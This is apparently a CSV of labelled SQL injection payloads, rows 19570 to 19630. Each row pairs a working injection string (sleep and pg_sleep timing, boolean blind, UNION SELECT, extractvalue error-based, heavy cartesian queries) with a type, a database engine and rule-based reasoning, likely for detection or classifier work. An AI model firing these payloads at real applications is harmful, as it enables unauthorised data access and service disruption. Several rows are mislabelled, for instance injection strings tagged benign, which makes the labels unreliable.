id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19570,select pg_sleep ( 5 ) and ( ( ( 'qslr' = 'qslr,time_blind,postgresql,0.9,"Token match: 'pg_sleep','pg_sleep' -> time_blind (priority P5); db_engine=postgresql from evidence ['pg_sleep']; payload snippet: 'select pg_sleep ( 5 ) and ( ( ( 'qslr' = 'qslr'",2
19571,"1' ) where 1093 = 1093 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",boolean_blind,mysql,0.8,"Token match: 'rlike/elt','extractvalue' -> boolean_blind (priority P3); db_engine=mysql from evidence ['extractvalue']; payload snippet: '1' ) where 1093 = 1093 and extractvalue ( 7982,con'",2
19572,"1%"" ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""%"" = """,time_blind,sqlite,0.9,"Token match: 'randomblob','randomblob' -> time_blind (priority P5); db_engine=sqlite from evidence ['randomblob']; payload snippet: '1%"" ) ) and 3202 = like ( 'abcdefg',upper ( hex ( '",2
19573,"1"" ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,0.95,"Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1"" ) ) ) and 9660 = ( select count ( * ) from all_'",3
19574,"1"" ) as wmng where 5976 = 5976",benign,generic,0.8,"No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1"" ) as wmng where 5976 = 5976'; db_evidence=none; classified benign/generic",2
19575,1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.95,"Token match: 'rlike/elt','rlike' -> boolean_blind (priority P3); db_engine=mysql from evidence ['rlike']; payload snippet: '1' ) ) rlike ( select * from ( select ( sleep ( 5 '",3
19576,1' ) ) or sleep ( 5 ) and ( ( 'taaj' = 'taaj,time_blind,generic,0.8,Token match: 'sleep(' -> time_blind (priority P5); db_engine=generic from evidence generic; payload snippet: '1' ) ) or sleep ( 5 ) and ( ( 'taaj' = 'taaj',2
19577,"1"" ) where 7919 = 7919 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.8,"Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1"" ) where 7919 = 7919 and char ( 111 ) ||char ( 7'",2
19578,1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,generic,0.8,Token match: 'sleep(' -> time_blind (priority P5); db_engine=generic from evidence generic; payload snippet: '1' ) ) and ( select * from ( select ( sleep ( 5 ) ',2
19579,"1%' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and '%' = '",boolean_blind,generic,0.8,Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1%' or exp ( ~ ( select * from ( select concat ( 0',2
19580,"1', ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",boolean_blind,oracle,0.8,"Token match: 'case when','xmltype','dual' -> boolean_blind (priority P3); db_engine=oracle from evidence ['xmltype', 'dual']; payload snippet: '1', ( select upper ( xmltype ( chr ( 60 ) ||chr ( '",2
19581,"1' where 7125 = 7125 or elt ( 6272 = 6272,sleep ( 5 ) ) --",boolean_blind,generic,0.95,"Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1' where 7125 = 7125 or elt ( 6272 = 6272,sleep ( '",3
19582,"1' ) as noqp where 4042 = 4042 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.95,"Token match: 'weak signal','sysibm' -> boolean_blind (priority P3); db_engine=db2 from evidence ['sysibm']; payload snippet: '1' ) as noqp where 4042 = 4042 or 8315 = ( select '",3
19583,-9217 or 9323 = 9323#,boolean_blind,generic,0.95,Token match: 'or 9323 = 9323' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-9217 or 9323 = 9323#',3
19584,1 ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 9932 = 9932,boolean_blind,generic,0.95,Token match: 'case when' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1 ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ',3
19585,"1' union all select null,null,null,null,null--",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '1' union all select null,null,null,null,null--'",3
19586,"1%"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""%"" = """,boolean_blind,mysql,0.95,"Token match: 'rlike/elt','rlike' -> boolean_blind (priority P3); db_engine=mysql from evidence ['rlike']; payload snippet: '1%"" rlike ( select * from ( select ( sleep ( 5 ) )'",3
19587,1' ) as fxid where 5926 = 5926,benign,generic,0.8,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1' ) as fxid where 5926 = 5926'; db_evidence=none; classified benign/generic,2
19588,1%' rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and '%' = ',boolean_blind,mysql,0.95,"Token match: 'rlike/elt','rlike' -> boolean_blind (priority P3); db_engine=mysql from evidence ['rlike']; payload snippet: '1%' rlike ( select * from ( select ( sleep ( 5 ) )'",3
19589,1'|| ( select 'ezse' from dual where 3821 = 3821,benign,oracle,0.65,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1'|| ( select 'ezse' from dual where 3821 = 3821'; db_evidence=['dual']; classified benign/generic,1
19590,"1' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'snad' like 'snad",boolean_blind,generic,0.95,Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1' ) and 6510 = ( select count ( * ) from sysusers',3
19591,( select ( case when ( 3592 = 3592 ) then 3592 else 3592* ( select 3592 from information_schema.character_sets ) end ) ),boolean_blind,mysql,0.95,"Token match: 'case when','information_schema' -> boolean_blind (priority P3); db_engine=mysql from evidence ['information_schema']; payload snippet: '( select ( case when ( 3592 = 3592 ) then 3592 els'",3
19592,1' ) ) ) order by 1--,boolean_blind,generic,0.65,Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1' ) ) ) order by 1--',1
19593,"-3719"" union all select 6609,6609,6609,6609#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-3719"" union all select 6609,6609,6609,6609#'",3
19594,"1"" ) ) as cduw where 4495 = 4495",benign,generic,0.8,"No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1"" ) ) as cduw where 4495 = 4495'; db_evidence=none; classified benign/generic",2
19595,1' ) ) as gchn where 5856 = 5856,benign,generic,0.8,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1' ) ) as gchn where 5856 = 5856'; db_evidence=none; classified benign/generic,2
19596,-2781 ) ) ) or 2573 = 5848--,boolean_blind,generic,0.95,Token match: 'or 2573 = 5848' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-2781 ) ) ) or 2573 = 5848--',3
19597,"1%"" ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""%"" = """,boolean_blind,generic,0.8,"Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1%"" ) ) and exp ( ~ ( select * from ( select conca'",2
19598,"-5548' where 4477 = 4477 union all select 4477,4477,4477,4477,4477,4477,4477,4477,4477,4477--",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-5548' where 4477 = 4477 union all select 4477,447'",3
19599,select pg_sleep ( 5 ) ) ||',time_blind,postgresql,0.9,"Token match: 'pg_sleep','pg_sleep' -> time_blind (priority P5); db_engine=postgresql from evidence ['pg_sleep']; payload snippet: 'select pg_sleep ( 5 ) ) ||''",2
19600,1 ) ) and 3228 = 7376#,boolean_blind,generic,0.95,Token match: 'and 3228 = 7376' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1 ) ) and 3228 = 7376#',3
19601,"1 ) where 9645 = 9645 union all select null,null,null--",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '1 ) where 9645 = 9645 union all select null,null,n'",3
19602,1 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,generic,0.8,Token match: 'sleep(' -> time_blind (priority P5); db_engine=generic from evidence generic; payload snippet: '1 and ( select * from ( select ( sleep ( 5 ) ) ) g',2
19603,"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'tfnb' = 'tfnb",heavy_query,postgresql,0.95,"Token match: 'generate_series(large)','generate_series' -> heavy_query (priority P4); db_engine=postgresql from evidence ['generate_series']; payload snippet: '1' ) ) ) or 8421 = ( select count ( * ) from gener'",3
19604,"select * from generate_series ( 5846,5846,case when ( 5846 = 5227 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.95,"Token match: 'case when','generate_series' -> boolean_blind (priority P3); db_engine=postgresql from evidence ['generate_series']; payload snippet: 'select * from generate_series ( 5846,5846,case whe'",3
19605,1' ) rlike sleep ( 5 ) and ( 'boto' = 'boto,boolean_blind,mysql,0.8,"Token match: 'rlike/elt','rlike' -> boolean_blind (priority P3); db_engine=mysql from evidence ['rlike']; payload snippet: '1' ) rlike sleep ( 5 ) and ( 'boto' = 'boto'",2
19606,"-6656"" ) union all select 3931#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-6656"" ) union all select 3931#'",3
19607,"1"" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""uosc"" = ""uosc",boolean_blind,generic,0.95,"Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1"" or 5286 = ( select count ( * ) from all_users t'",3
19608,1 ) ) as zoso where 3633 = 3633,benign,generic,0.8,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1 ) ) as zoso where 3633 = 3633'; db_evidence=none; classified benign/generic,2
19609,"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,generic,0.65,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 10'; db_evidence=none; classified benign/generic,1
19610,1 ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 7015 = 7015,time_blind,postgresql,0.9,"Token match: 'pg_sleep','pg_sleep' -> time_blind (priority P5); db_engine=postgresql from evidence ['pg_sleep']; payload snippet: '1 ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) '",2
19611,"1'|| ( select 'xuof' from dual where 8794 = 8794 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,oracle,0.95,"Token match: 'generate_series(large)','dual' -> heavy_query (priority P4); db_engine=oracle from evidence ['dual']; payload snippet: '1'|| ( select 'xuof' from dual where 8794 = 8794 o'",3
19612,1' ) ) as cpwx where 5378 = 5378 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.95,"Token match: 'rlike/elt','rlike' -> boolean_blind (priority P3); db_engine=mysql from evidence ['rlike']; payload snippet: '1' ) ) as cpwx where 5378 = 5378 rlike ( select * '",3
19613,"1' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 'ywxe' like 'ywxe",error_based,mysql,0.9,"Token match: 'extractvalue','extractvalue','benchmark' -> error_based (priority P4); db_engine=mysql from evidence ['extractvalue', 'benchmark']; payload snippet: '1' ) ) procedure analyse ( extractvalue ( 9255,con'",2
19614,1 ) where 7956 = 7956 or sleep ( 5 ) #,time_blind,generic,0.8,Token match: 'sleep(' -> time_blind (priority P5); db_engine=generic from evidence generic; payload snippet: '1 ) where 7956 = 7956 or sleep ( 5 ) #',2
19615,"-9774' ) ) ) union all select 6954,6954,6954#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-9774' ) ) ) union all select 6954,6954,6954#'",3
19616,"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'ayjb' like 'ayjb",boolean_blind,generic,0.8,"Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( '",2
19617,"1 ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 8189 = 8189",boolean_blind,mysql,0.65,"Token match: 'weak signal','benchmark' -> boolean_blind (priority P3); db_engine=mysql from evidence ['benchmark']; payload snippet: '1 ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a47'",1
19618,"1%' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.8,Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1%' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99',2
19619,"1 ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 9333 = 9333",boolean_blind,firebird,0.95,"Token match: 'weak signal','rdb$fields','rdb$types' -> boolean_blind (priority P3); db_engine=firebird from evidence ['rdb$fields', 'rdb$types', 'rdb$collations', 'rdb$functions', 'rdb$']; payload snippet: '1 ) ) or 7552 = ( select count ( * ) from rdb$fiel'",3
19620,"1%' ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.8,Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1%' ) ) ) and char ( 107 ) ||char ( 121 ) ||char (',2
19621,"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'mnod' = 'mnod",time_blind,sqlite,0.9,"Token match: 'randomblob','randomblob' -> time_blind (priority P5); db_engine=sqlite from evidence ['randomblob']; payload snippet: '1' and 3202 = like ( 'abcdefg',upper ( hex ( rando'",2
19622,"-7700%' ) union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-7700%' ) union all select 5660,5660,5660,5660,566'",3
19623,"1 ) as pcnd where 4589 = 4589 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.95,Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '1 ) as pcnd where 4589 = 4589 union all select nul',3
19624,1'+ ( select yjyp where 9696 = 9696,benign,generic,0.65,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1'+ ( select yjyp where 9696 = 9696'; db_evidence=none; classified benign/generic,1
19625,1 where 8214 = 8214 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,boolean_blind,generic,0.95,Token match: 'case when' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1 where 8214 = 8214 and 2853 = cast ( ( chr ( 113 ',3
19626,"-9574%' ) ) union all select 5645,5645,5645,5645,5645,5645,5645--",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-9574%' ) ) union all select 5645,5645,5645,5645,5'",3
19627,"1 ) as khkv where 2944 = 2944 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.8,"Token match: 'rlike/elt','information_schema' -> boolean_blind (priority P3); db_engine=mysql from evidence ['information_schema']; payload snippet: '1 ) as khkv where 2944 = 2944 and ( select 9067 fr'",2
19628,"-3933%"" ) ) or elt ( 8142 = 2978,2978 ) and ( ( ""%"" = """,boolean_blind,generic,0.8,"Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-3933%"" ) ) or elt ( 8142 = 2978,2978 ) and ( ( ""%'",2
19629,select ( case when ( 5322 = 6200 ) then 5322 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.95,"Token match: 'case when','dual' -> boolean_blind (priority P3); db_engine=oracle from evidence ['dual']; payload snippet: 'select ( case when ( 5322 = 6200 ) then 5322 else '",3
19630,"1%' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( '%' = '",boolean_blind,generic,0.95,Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1%' ) ) ) and 5556 = ( select count ( * ) from all',3
